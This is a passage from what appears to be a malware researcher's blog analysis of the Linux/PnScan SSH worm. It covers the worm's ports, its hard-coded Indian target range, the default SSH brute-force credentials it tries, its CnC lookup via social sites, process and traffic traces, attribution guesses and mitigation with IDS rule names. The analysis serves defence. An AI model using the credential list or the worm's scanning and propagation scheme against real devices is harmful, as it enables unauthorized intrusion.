\/\u003E-rw-r--r--    4 Aug 23 12:02 MalwareFile.pid  \u003C-- pids\u003Cbr \/\u003E-rw-r--r--    0 Aug 23 12:02 daemon.log       \u003C-- malware log\u003Cbr \/\u003E-rw-r--r--   35 Aug 23 12:02 login2           \u003C-- brute auth\u003Cbr \/\u003Edrwxr-xr-x 4096 Aug 23 12:02 files\/           \u003C-- updates\/downloads\/C2 data\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E3. Daemonizing and listening to these 2 TCP ports: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EIPv4 TCP\/＊:9000 (for \/check command and \/upload command's remote access)\u003Cbr \/\u003EIPv4 TCP\/＊:1337 (remote uptime or ping quick check)\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E4. Attacking initially to target IPs in: 183.83.0.0 \/ 16 (hard coded) \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003ECountry: 'India (Telangana, Kashmit region network in India)'\u003Cbr \/\u003EFor 'SSH services' in  port: 'TCP\/22' (ssh)\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E5. Having function to brute force login with the below auth: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E  root:root\u003Cbr \/\u003E  admin:admin\u003Cbr \/\u003E  ubnt:ubnt\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E6. SSL traffic sent via HTTP\/1.1 requests to \u003Ci\u003Etwitter.com\u003C\/i\u003E, \u003Ci\u003Ereddit.com\u003C\/i\u003E, google.com, microsoft.com etc listed URL on the SSL port TCP\/443↓ \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Ewrite(113, \"\\26\\3\\1\\2\\0\\1\\0\\1\\374\\3\\3%\\254\\231\\25\\346\\263EuU\\vI\\26\\10bc\\0I_\\246\\262g\\273\\267\u003Cbr \/\u003E\\342C\\24\\33l\\327\\214R\\215\\0\\0\\240\\3000\\300,\\300(\\300$\\300\\24\\300\\n\\0\\245\\0\\243\\0\\241\\0\\237\\0\u003Cbr \/\u003Ek\\0j\\0i\\0h\\0009\\0008\\0007\\0006\\0\\210\\0\\207\\0\\206\\0\\205\\3002\\300.\\300*\\300\u0026\\300\\17\\300\\5\\0\\23\u003Cbr \/\u003E5\\0=\\0005\\0\\204\\300\/\\300+\\300'\\300#\\300\\23\\300\\t\\0\\244\\0\\242\\0\\240\\0\\236\\0g\\0@\\0?\\0\u003E\\0003\\00\u003Cbr \/\u003E02\\0001\\0000\\0\\232\\0\\231\\0\\230\\0\\227\\0E\\0D\\0C\\0B\\3001\\300-\\300)\\300%\\300\\16\\300\\4\\0\\234\\0\u003C\\0\u003Cbr \/\u003E\/\\0\\226\\0A\\0\\7\\300\\22\\300\\10\\0\\26\\0\\23\\0\\20\\0\\r\\300\\r\\300\\3\\0\\n\\0\\377\\1\\0\\0013\\0\\0\\0\\20\\0\\16\u003Cbr \/\u003E\\0\\0'\\vtwitter.com'\\0\\v\\0\\4\\3\\0\\1\\2\\0\\n\\0\\34\\0\\32\\0\\27\\0\\31\\0\\34\\0\\33\\0\\30\\0\\32\\0\\26\\0\\16\\0\\r\u003Cbr \/\u003E\\v\\0\\f\\0\\t\\0\\n\\0\\r\\0 \\0\\36\\6\\1\\6\\2\\6\\3\\5\\1\\5\\2\\5\\3\\4\\1\\4\\2\\4\\3\\3\\1\\3\\2\\3\\3\\2\\1\\2\\2\\2\\3\\0\\17\u003Cbr \/\u003E\\0\\1\\0013t\\0\\0\\0\\20\\0\\v\\0\\t'\\10http\/1.1'\\0\\25\\0\\267\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\\u003Cbr \/\u003E   :\u003Cbr \/\u003E0\\0\\0\\0\\0\\0\\0\", 517)\u003Cbr \/\u003E\u003C\/pre\u003ETo be clear in ↓PCAP :) ping EmergingThreat Lab friends!\u003Cbr\u003E \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/ElOldHOjoqyHVynB46AnFX4N29yZ_Kp2J7TE1CBrmIDmMNGO7a0arZbxrnCyP0asbtfC6PHqOO7Txw=w660-h909-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/ElOldHOjoqyHVynB46AnFX4N29yZ_Kp2J7TE1CBrmIDmMNGO7a0arZbxrnCyP0asbtfC6PHqOO7Txw=w580-h580-no\u003E\u003C\/a\u003E \u003Cbr\u003E(Note: well, actually this function is also known too way back before.. )  \u003Cp\u003E7. Plain and SSL encrypted CNC traffic  \u003Cp\u003EThe CNC calls will be performed upon successful function to seek its CNC related info via the requests sent in list of SNS (+other sites too) via SSL.   \u003Cp\u003EThe \u003Ci\u003ETwitter\u003C\/i\u003E (and other SNS\/sites i.e.: \u003Ci\u003Ereddit.com\u003C\/i\u003E, \u003Ci\u003Emicrosoft.com\u003C\/i\u003E, \u003Ci\u003Egoogle.com\u003C\/i\u003E, \u003Ci\u003Emy.mail.ru\u003C\/i\u003E) requests are utilized by this worm to do one important step to perform callback the CNC, by generation files in \u003Cb\u003E\/files\/\u003C\/b\u003E contains the CNC IP and its ports (See the ELF video.posted above). I waited long enough to be sure that no CNC is reached, but none available at this moment, assuming the worm is moving around in circle in the targeted network and accidentally hit my trap planted in the area. The worm is responding to the known bot protocol in the port TCP\/9000 if you want to try some test for communicating with this worm. Port TCP\/1337 is another indicator for the success infection. Both TCP\/9000 and TCP\/1337 are open, and has \u003Ci\u003Econnectable (ESTBLISHED)\u003C\/i\u003E TCP state.  \u003Cp\u003EThe worm, in this particular sample, when it can't reach the CNC, will keep on requesting to the next SSL media that was contacted. In this case, it will keep on contacting the \u003Cb\u003Etwitter.com\u003C\/b\u003E, \u003Cb\u003Ereddit.com\u003C\/b\u003E, \u003Ci\u003Egoogle.com\u003C\/i\u003E and etc SNS URL hardcoded in the binary (see the below embedded video for the list) with permutating wordlist posted to the request after the SSL is established. This action to then triggering initial CNC list generation and making effort to seek for the motherhost connection (which it seems unreachable or down now).   \u003Cp\u003ESome of the requests during the initial infection stage can be seen in the PCAP snapshot that I had collected as per below:  \u003Cp\u003EInitiating connection:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/CqydxyjdCAMDYb6NGuGpff5kUSphiz1lR2y_J0NYEBFer34dRz73gDy3pBaYDQHLEVBE9Pk28YihVQ=w1234-h352-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/CqydxyjdCAMDYb6NGuGpff5kUSphiz1lR2y_J0NYEBFer34dRz73gDy3pBaYDQHLEVBE9Pk28YihVQ=w580-h500-no\u003E\u003C\/a\u003E \u003Cp\u003EClient request the hello:\u003Cbr\u003E \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/_3XJCO_jevd6kAGCa7Jj3kyBq7mkR4wB-xeJ3gSbINGO0bPRQImhU8S6Qi3ZNW7JsKWa6reBIblJAg=w1034-h128-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/_3XJCO_jevd6kAGCa7Jj3kyBq7mkR4wB-xeJ3gSbINGO0bPRQImhU8S6Qi3ZNW7JsKWa6reBIblJAg=w580-h128-no\u003E\u003C\/a\u003E \u003Cp\u003EServer is replied with key and response:\u003Cbr\u003E \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/tvGjYpk30bb-2rfYTKVmN8uMt6xaHr8w7L88LWCBXPsls3p9lF4ENxapahkjt8SkvcYkNmjnCgANQQ=w1108-h189-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/tvGjYpk30bb-2rfYTKVmN8uMt6xaHr8w7L88LWCBXPsls3p9lF4ENxapahkjt8SkvcYkNmjnCgANQQ=w580-h189-no\u003E\u003C\/a\u003E \u003Cp\u003ENo CNC connection found yet, it was re-trying to next.. reddit.com now:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/uH__1mMM6JJm2DDp0EnR4ztHPhUcxcLJ4qDDeVfs4570dXbCt3R8oD-L8m9gFkk2OU8b6kReLPrEnw=w372-h346-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/uH__1mMM6JJm2DDp0EnR4ztHPhUcxcLJ4qDDeVfs4570dXbCt3R8oD-L8m9gFkk2OU8b6kReLPrEnw=w580-h346-no\u003E\u003C\/a\u003E \u003Cp\u003EAgain, these requests will keep on going while the worm is keep on continuing scanning and listing up the successfully scanned hosts and successfully brute-targeted SSH attack list. The activity will keep on going on until the worm can connect to the CNC and the hacker can reach back to the infected host and remotely send more instruction for other attacks via port TCP\/9000 (noted the inbound and outbound traffic from and to this port).  \u003Cp\u003EThis is why the coder was using SSL configuration during the compilation, they need to use SSL certification of twitter. reddit, microsoft, google etc  for the generation of data to be used for further effort in making CNC connection.   \u003Cp\u003E[EDIT]\u003Cbr\u003EI thought there might be a way for the IDS signature for blocking this twitter connection for this worm can be used for the pinpoint to mitigate the growing infection on the targeted network. For that purpose, upon consulted to the team of experts in ETLabs [\u003Ca href=\"https:\/\/www.proofpoint.com\/us\/solutions\/products\/threat-intelligence\"\u003Elink\u003C\/a\u003E], the result is negative. Following is the explanation: \u003Ci\u003EUnfortunately there isn't anything we can do there, there's SSL traffic to Twitter which on a network sensor will be encrypted. It's impossible to differentiate between infection traffic and legitimate Twitter traffic from our standpoint. Also, nothing appears abnormal in the SSH scanning.\u003C\/i\u003E.  \u003Cbr\u003E[\/EDIT]  \u003Cp\u003E[EDIT 2]\u003Cbr\u003EDiscussing further with the ETLabs engineer friends, collaborating to mitigate this threat and the good result came up. We found way to mitigate the infection by the ETLab's traffic filtration signature. The details for this filtration you can see in the mitigation section. Thank you for the nice discussion and great work!  \u003Cbr\u003E[\/EDIT]  \u003Cp\u003E\u003Ch2\u003EInfection Symtoms\u003C\/h2\u003E \u003Cp\u003EInfected node will have traces of these process running made during the initial infection: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Estdin 2712 root  cwd    DIR        8,1     4096  131126 \/test\/\u003Cbr \/\u003Estdin 2712 root  rtd    DIR        8,1     4096       2 \/\u003Cbr \/\u003Estdin 2712 root  txt    REG        8,1  1034309  131146 \/test\/stdin\u003Cbr \/\u003Estdin 2712 root    0u   REG        8,1        0  131171 \/test\/daemon.log\u003Cbr \/\u003Estdin 2712 root    1u   REG        8,1        0  131171 \/test\/daemon.log\u003Cbr \/\u003Estdin 2712 root    2u   CHR      136,0      0t0       3 \/dev\/pts\/0\u003Cbr \/\u003Estdin 2712 root    3r  FIFO        0,8      0t0    6188 pipe\u003Cbr \/\u003Estdin 2712 root    4w  FIFO        0,8      0t0    6188 pipe\u003Cbr \/\u003Estdin 2712 root    5u  0000        0,9        0    1185 anon_inode\u003Cbr \/\u003Estdin 2712 root    6u  unix 0xcda07300      0t0    6191 socket\u003Cbr \/\u003Estdin 2712 root    7u  unix 0xce020d40      0t0    6192 socket\u003Cbr \/\u003Estdin 2712 root    8u  IPv4       6193      0t0     TCP *:9000 (LISTEN)\u003Cbr \/\u003Estdin 2712 root    9u  0000        0,9        0    1185 anon_inode\u003Cbr \/\u003Estdin 2712 root   10u  unix 0xce020ac0      0t0    6194 socket\u003Cbr \/\u003Estdin 2712 root   11u  unix 0xce020840      0t0    6195 socket\u003Cbr \/\u003Estdin 2712 root   12u  IPv4       6196      0t0     TCP *:1337 (LISTEN)\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EAnd the launched attack can be seen in the network connectivity like per shown in the list of files and connection: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Estdin 2712 root  13u  IPv4 6197  0t0 TCP x.x.x.x:40709-\u003E183.83.0.0:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  14u  IPv4 6198  0t0 TCP x.x.x.x:37944-\u003E183.83.0.1:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  15u  IPv4 6199  0t0 TCP x.x.x.x:35576-\u003E183.83.0.2:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  16u  IPv4 6200  0t0 TCP x.x.x.x:41811-\u003E183.83.0.3:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  17u  IPv4 6201  0t0 TCP x.x.x.x:43278-\u003E183.83.0.4:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  18u  IPv4 6202  0t0 TCP x.x.x.x:37969-\u003E183.83.0.5:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  19u  IPv4 6203  0t0 TCP x.x.x.x:39383-\u003E183.83.0.6:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  20u  IPv4 6204  0t0 TCP x.x.x.x:38038-\u003E183.83.0.7:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  21u  IPv4 6205  0t0 TCP x.x.x.x:35040-\u003E183.83.0.8:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  22u  IPv4 6206  0t0 TCP x.x.x.x:59569-\u003E183.83.0.9:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  23u  IPv4 6207  0t0 TCP x.x.x.x:50921-\u003E183.83.0.10:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  24u  IPv4 6208  0t0 TCP x.x.x.x:36079-\u003E183.83.0.11:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  25u  IPv4 6209  0t0 TCP x.x.x.x:35134-\u003E183.83.0.12:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  26u  IPv4 6210  0t0 TCP x.x.x.x:59932-\u003E183.83.0.13:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  27u  IPv4 6211  0t0 TCP x.x.x.x:35682-\u003E183.83.0.14:22 (SYN_SENT)\u003Cbr \/\u003Estdin 2712 root  28u  IPv4 6212  0t0 TCP x.x.x.x:57709-\u003E183.83.0.15:22 (SYN_SENT)\u003Cbr \/\u003E  :                                                            :\u003Cbr \/\u003E\u003C\/pre\u003ETo be more precise of the aimed network for this attack specifically, below is the PoC video of the recorded PCAP, the data is too big so the video is only covering about 3% of the recorded scanning and SSH login\/bruting access:\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"435\" src=\"https:\/\/www.youtube.com\/embed\/IX6L7v8dXsk?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E\u003Cbr\u003EYou can imagine how hectic these traffic will be in targeted network if there are some tens or maybe hundreds infected boxes.. The actor can create a massive chain of infection if they are aiming the right network with having the right vulnerable default SSH login.  \u003Cp\u003EEach connected target is logged in the \"list2\" file: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0000  31 38 33 2e 38 33 2e 30  2e 33 33 3b 32 32 3b 0a  |183.83.0.33;22;.|\u003Cbr \/\u003E0010  31 38 33 2e 38 33 2e 30  2e 38 30 3b 32 32 3b 0a  |183.83.0.80;22;.|\u003Cbr \/\u003E0020  31 38 33 2e 38 33 2e 32  2e 32 36 3b 32 32 3b 0a  |183.83.2.26;22;.|\u003Cbr \/\u003E0030  31 38 33 2e 38 33 2e 32  2e 34 31 3b 32 32 3b 0a  |183.83.2.41;22;.|\u003Cbr \/\u003E0040  31 38 33 2e 38 33 2e 32  2e 31 31 30 3b 32 32 3b  |183.83.2.110;22;|\u003Cbr \/\u003E0050  0a 31 38 33 2e 38 33 2e  32 2e 32 31 30 3b 32 32  |.183.83.2.210;22|\u003Cbr \/\u003E0060  3b 0a 31 38 33 2e 38 33  2e 33 2e 32 32 3b 32 32  |;.183.83.3.22;22|\u003Cbr \/\u003E0070  3b 0a 31 38 33 2e 38 33  2e 33 2e 31 34 38 3b 32  |;.183.83.3.148;2|\u003Cbr \/\u003E0080  32 3b 0a 31 38 33 2e 38  33 2e 34 2e 39 33 3b 32  |2;.183.83.4.93;2|\u003Cbr \/\u003E0090  32 3b 0a 31 38 33 2e 38  33 2e 34 2e 31 35 36 3b  |2;.183.83.4.156;|\u003Cbr \/\u003E00a0  32 32 3b 0a 31 38 33 2e  38 33 2e 35 2e 31 36 3b  |22;.183.83.5.16;|\u003Cbr \/\u003E00b0  32 32 3b 0a 31 38 33 2e  38 33 2e 35 2e 32 30 36  |22;.183.83.5.206|\u003Cbr \/\u003E00c0  3b 32 32 3b 0a 31 38 33  2e 38 33 2e 36 2e 31 32  |;22;.183.83.6.12|\u003Cbr \/\u003E00d0  37 3b 32 32 3b 0a 31 38  33 2e 38 33 2e 37 2e 34  |7;22;.183.83.7.4|\u003Cbr \/\u003E00e0  33 3b 32 32 3b 0a 31 38  33 2e 38 33 2e 37 2e 31  |3;22;.183.83.7.1|\u003Cbr \/\u003E00f0  32 33 3b 32 32 3b 0a 31  38 33 2e 38 33 2e 37 2e  |23;22;.183.83.7.|\u003Cbr \/\u003E0100  31 38 37 3b 32 32 3b 0a  31 38 33 2e 38 33 2e 31  |187;22;.183.83.1|\u003Cbr \/\u003E0110  31 2e 35 31 3b 32 32 3b  0a 31 38 33 2e 38 33 2e  |1.51;22;.183.83.|\u003Cbr \/\u003E0120  31 31 2e 38 34 3b 32 32  3b 0a 31 38 33 2e 38 33  |11.84;22;.183.83|\u003Cbr \/\u003E0130  2e 31 31 2e 31 36 38 3b  32 32 3b 0a 31 38 33 2e  |.11.168;22;.183.|\u003Cbr \/\u003E0140  38 33 2e 31 32 2e 31 34  35 3b 32 32 3b 0a 31 38  |83.12.145;22;.18|\u003Cbr \/\u003E0150  33 2e 38 33 2e 31 32 2e  32 34 30 3b 32 32 3b 0a  |3.83.12.240;22;.|\u003Cbr \/\u003E0160  31 38 33 2e 38 33 2e 31  33 2e 31 36 32 3b 32 32  |183.83.13.162;22|\u003Cbr \/\u003E0170  3b 0a 31 38 33 2e 38 33  2e 31 34 2e 39 32 3b 32  |;.183.83.14.92;2|\u003Cbr \/\u003E0180  32 3b 0a                                          |2;.|\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EAnd you may find the brute list trace in file \"login2\" \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0000  72 6f 6f 74 3b 72 6f 6f  74 3b 0a 61 64 6d 69 6e  |root;root;.admin|\u003Cbr \/\u003E0010  3b 61 64 6d 69 6e 3b 0a  75 62 6e 74 3b 75 62 6e  |;admin;.ubnt;ubn|\u003Cbr \/\u003E0020  74 3b 0a                                          |t;.|\u003Cbr \/\u003E0023\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003ENoted: the PID of main process is saved in [MalwareFile].pid \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0000  32 37 31 32  |2712|\u003Cbr \/\u003E0004\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E\u003Cb\u003EThe origin of the threat\u003C\/b\u003E \u003Cp\u003ERegarding the source of this threat. I have discussion with my good colleague, I would like to not mention his\/her identification for his\/her security protection.  \u003Cp\u003E\u003Cb\u003E1. The compilation traces\u003C\/b\u003E \u003Cp\u003EThe traces that lead to the \u003Ci\u003Ecross compiling tool\u003C\/i\u003E used, which was showing the Truecrypt was used. This method of running Truecrypt in the work directory is still seen a lot in several activities of cyber crooks on East Europe region (while in the western part or my part of area, mostly we already abandoned this technology for its insecurity). Which is suggesting the origin of this threat.   \u003Cbr\u003EThe data of the compilation traces: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0x8238ff8 102 101 OPENSSLDIR: \"\/media\/truecrypt1\/my\/framework\/..\/toolchains\/cross-compiler-i686\/i686-unknown-linux\/ssl\"\u003Cbr \/\u003E0x8248eac 96 95 \/media\/truecrypt1\/my\/framework\/..\/toolchains\/cross-compiler-i686\/i686-unknown-linux\/lib\/engines\u003Cbr \/\u003E0x825e294 96 95 \/media\/truecrypt1\/my\/framework\/..\/toolchains\/cross-compiler-i686\/i686-unknown-linux\/ssl\/private\u003Cbr \/\u003E0x825e2f4 88 87 \/media\/truecrypt1\/my\/framework\/..\/toolchains\/cross-compiler-i686\/i686-unknown-linux\/ssl\u003Cbr \/\u003E0x825e34c 94 93 \/media\/truecrypt1\/my\/framework\/..\/toolchains\/cross-compiler-i686\/i686-unknown-linux\/ssl\/certs\u003Cbr \/\u003E0x825e3ac 97 96 \/media\/truecrypt1\/my\/framework\/..\/toolchains\/cross-compiler-i686\/i686-unknown-linux\/ssl\/cert.pem\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E\u003Cb\u003E2. The MY.MAIL.RU's API used\u003C\/b\u003E \u003Cp\u003EIn the SNS service url list where the worm is using to start effort to reach its CNC, it was found the specific API of mail.ru, a russian big public email service. We think, only russian speaking bad actors (I don't say \"nationality\" here, but this shows \u003Cb\u003Ehigh possibility\u003C\/b\u003E that the actor \u003Ci\u003Emay \u003C\/i\u003Eresiding in there), who know how use specific subdomain of \u003Cb\u003Emy.mail.ru\u003C\/b\u003E with its API as per shown below:  \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0x8220f7a 11 10 my.mail.ru\u003Cbr \/\u003E0x8220f85 20 19 https:\/\/%s\/mail\/%s\/\u003Cbr \/\u003E\u003C\/pre\u003EFor these 1. and 2. forensics result we herewith inform to the legal and law enforcement to make a proper action and record accordingly.  \u003Cp\u003E\u003Ch2\u003EMitigation and detection method against PnScan worm infection\u003C\/h2\u003E \u003Cp\u003E\u003Cb\u003ESome ways to fight this worm:\u003C\/b\u003E\u003Cp\u003E\u003Cli\u003E A way to prevent this worm attacking your hosting, ISP routers services or further, the IoT devices is by making sure there is no SSH default authentication box is running on your network, and please avoid using standard port for the SSH service, if possible.\u003Cbr\u003E\u003Cli\u003E To trim the infection in the large scale network you can use the port TCP\/1337 and also TCP\/9000 as TCP connection target. If both ports of a node is accepting your TCP connection and go to the ESTABLISHED state, there is a good chance the device is infected, to be sure you can check further. There are also several services running by using TCP\/9000, you can view the possibility in this site [\u003Ca href=\"http:\/\/www.speedguide.net\/port.php?port=9000\"\u003Elink\u003C\/a\u003E].\u003Cbr\u003E\u003Cli\u003E As per explained above, it was preliminary explained, there is a difficulty for IDS\/IPS to filter the SNS sent request via SSL from these worm's infected hosts, but if you see your appliance, routers. servers or IoT devices in your network that is keeping on sending connection to \u003Cb\u003Etwitter.com\u003C\/b\u003E or \u003Cb\u003Ereddit.com\u003C\/b\u003E or etc sites listed in this post, and those devices are not suppose to do so, please be aware and check the access on the TCP\/1337 or TCP\/9000 ports whether they are opened or not. If possible check by your tool to established connection to those both ports, a simple netcat will do. If the worm's actor\/hacker sees the tcp\/9000 and tcp\/1337 is OPEN in a device during portscanning, he will know exactly that PnScan hit it and can conduct his evil further step further too. So, if your box has these symtoms, \u003Cb\u003Etake it offline\u003C\/b\u003E and try to check the inside if available, if the access is not applicable for you to check, you'd better to reset the firmware, restart the device and restore the saved setting, to then change the default passwords (and SSH port number if possible), before making it back online. \u003Cbr\u003E\u003Cli\u003E And for the servers, cleaning up the worm is not difficult, the worm doesn't \u003Ci\u003Erootkit\u003C\/i\u003E the infected device at the earliest infection stage, so unless the actor\/hacker(s) is not reached back yet and make extra effort \u003Ci\u003Eto root\u003C\/i\u003E the victim's device further, deletion of the working directory (along with \/tmp saved files and related malware work directory \".\/files\/\"), with also deleting the trojan binaries and its components can clean up the box well. Before the deletion, snapshot the list of process with the networking viewable option, and then take it offline during the fixing, So far there is no persistence autostart setting for this worm, which is good, so I think the infection can be neutralized safely. \u003Cli\u003E Just to be sure you know the danger for not \u003Ci\u003Eofflining \u003C\/i\u003Eyour system. This worm is scanning SSH ports in TCP\/22 with common SSH request, bruting it, infect it, try to reach its CNC along with its persistent continuous activity to keep on scanning to infect more infection nodes with the very fast speed, In several minutes I count more than one hundred nodes attacked during the analysis. Please, \u003Cb\u003Emake sure that you are offline-ing the infected system as soon as possible\u003C\/b\u003E. If one node had infection, there is a strong possibility there is another infected Linux box in the x.x.0.0\/16 segment of your IP too, warn your ISP and CERT immediately for the services to be aware for this epidemic precaution. \u003Cli\u003E Please contact me by leaving comments for further assistance, or try to DM to our twitter account in @malwaremustdie, we will help in anyway I can. We do this after work hours so please bear the slow reply.  \u003Cp\u003E\u003Cb\u003ESignature to block the traffic of Linux\/PnScan\u003C\/b\u003E\u003Cp\u003EThank you \u003Ci\u003EETLab \u003C\/i\u003Efor kindly help all of us by releasing the Snort and Suricata open rules to mitigate this threat.\u003Cbr\u003E \u003Cimg src=https:\/\/lh3.googleusercontent.com\/ATVF4Z6t4YuJ3D3EXmQ4bVWMtedKEzqm75wIDnFvPoLkNyKwjyr8h8mwFG_NrKwIKp7fKuUkX_XzZA=w499-h389-no\u003E \u003Cbr\u003EThe rules are complex and designed to detect any symtoms required networking activity generated from this worm, with the function that can be seen below: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E2023087 - ET TROJAN PNScan.2 Inbound Status Check - set (trojan.rules)\u003Cbr \/\u003E2023088 - ET TROJAN PNScan.2 Inbound Status Check Response (trojan.rules)\u003Cbr \/\u003E2023089 - ET TROJAN PNScan.2 CnC Beacon (trojan.rules)\u003Cbr \/\u003E2023090 - ET TROJAN PNScan.2 CnC Beacon 2 (trojan.rules)\u003Cbr \/\u003E\u003C\/pre\u003ETo be noted: It is maybe a bit confusing you but DO NOT mix this worm with the trojan of Linux\/PnScan.1 or version one, which is working in different activity (port scanner and DDOS) and not having a worm function, Additionally naming of these threat was taken from the first entity who released its announce.   \u003Cp\u003E\u003Ch2\u003EConclusion, Samples \u0026 Reference\u003C\/h2\u003E \u003Cp\u003EThis worm is re-infecting i86 Linux machines in the target mentioned above and all of the data posted above are important hazards to block its infection and distribution. The worm is hitting a box, scan for more and each box is hitting some more boxes too, the growth is exponentially increased if it is spread in vulnerable network. For this particular case we wrote here, I guess this happened between from 6 months ago until now, and the hacker could be sitting there in Russia network waiting for the right chance to access any accessible infected nodes. If you take a look closer to the explained \u003Ci\u003Eauth data \u003C\/i\u003Ethen you may guess which distribution of boxes that are actually aimed.  \u003Cp\u003E\u003Cb\u003ERelated links and last notes  \u003C\/b\u003E\u003Cp\u003EYou'll see deeper detail in previous writing \u0026 thread here --\u003E[\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3975\u0026p=26827#p26827\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003ESample is in VirusTotal [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/5685b086ce12ffede8814e303223a67eca476735dfe4e9e84b751354a5ea0232\/analysis\/1471967010\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003EDr. Web wrote details of the threat, they correctly see what we see, good work! [\u003Ca href=\"http:\/\/vms.drweb.com\/virus\/?_is=1\u0026i=7299536\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003EPS: The warning of this threat was sent to regional CERT. \u003Cp\u003E \u003Cimg src=https:\/\/lh3.googleusercontent.com\/TvIZqetyBC-RhWgyLRnfCV9XeAakGFo4uO-0izr4y110NjywQZ9RjXjCq__gUk0kVRmxoYCtNFyEjQ=w320-h350-no\u003E \u003Cp\u003E\u003Ch2\u003EThank you very much for the internet media awareness\u003C\/h2\u003E \u003Cp\u003EWe, MMD thank our good friends in internet media for your fast awareness of this threat:\u003Cbr\u003E\u003Ci\u003E1. Security Affairs [\u003Ca href=\"http:\/\/securityaffairs.co\/wordpress\/50607\/malware\/linux-pnscan-return.html\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E2. Softpedia [\u003Ca href=\"http:\/\/news.softpedia.com\/news\/pnscan-linux-trojan-resurfaces-with-new-attacks-targeting-routers-in-india-507617.shtml\"\u003Elink\u003C\/a\u003E]  \u003Cbr\u003E3. Security Week [\u003Ca href=\"http:\/\/www.securityweek.com\/linux-trojan-brute-forces-routers-install-backdoors\"\u003Elink\u003C\/a\u003E]  \u003Cbr\u003E4. Anti Malware .ru [\u003Ca href=\"https:\/\/www.anti-malware.ru\/news\/2016-08-25\/20769#\"\u003Elink\u003C\/a\u003E]  \u003Cbr\u003E5. Sensor Tech Forum  [\u003Ca href=\"http:\/\/sensorstechforum.com\/linux-pnscan-malware-brute-forces-linux-based-routers\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E6. IPS Info .ru [\u003Ca href=\"https:\/\/ipsinfo.ru\/news\/security\/troyan-na-linux-ustanavlivaet-na-marshrutizatoryi-bekdoryi-r216\/\"\u003Elink\u003C\/a\u003E]  \u003Cbr\u003E7. Romania Net [\u003Ca href=\"http:\/\/romania-net.blogspot.com\/2016\/08\/linux-trojan-brute-forces-routers.html\"\u003Elink\u003C\/a\u003E]\u003C\/i\u003E \u003Cbr\u003E8. Virus Info forum [\u003Ca href=\"http:\/\/virusinfo.info\/showthread.php?t=203426\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E9. News Asis .IO (In Arabic) [\u003Ca href=\"https:\/\/news.asis.io\/content\/%D8%AA%D8%B1%D9%88%D8%AC%D8%A7%D9%86-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%D8%A8%D8%A7-%D8%A7%D9%86%D8%AC%D8%A7%D9%85-%D8%AD%D9%85%D9%84%D9%87-%D8%AC%D8%B3%D8%AA%D8%AC%D9%88%DB%8C-%D9%81%D8%B1%D8%A7%DA%AF%DB%8C%D8%B1-%D8%A8%D9%87-%D9%85%D8%B3%DB%8C%D8%B1%DB%8C%D8%A7%D8%A8%E2%80%8C%D9%87%D8%A7-%D8%AF%D8%B1%D9%BE%D8%B4%D8%AA%DB%8C-%D9%86%D8%B5%D8%A8-%D9%85%DB%8C%E2%80%8C%DA%A9%D9%86%D8%AF\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003EA nice alert (thanks!) and guide line to prevent the threat by EScan, PocketAlert and ItVarNews in 